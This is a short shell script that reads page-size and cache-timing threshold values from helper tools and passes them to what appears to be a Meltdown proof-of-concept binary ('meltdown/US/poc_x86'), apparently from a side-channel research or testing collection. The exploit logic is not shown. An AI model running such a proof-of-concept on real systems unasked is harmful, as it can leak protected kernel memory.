pagesize=`./libcache/get_pagesize`
threshold=`./libcache/get_threshold`
echo "pagesize = $pagesize, threshold = $threshold"
./meltdown/US/poc_x86 $pagesize $threshold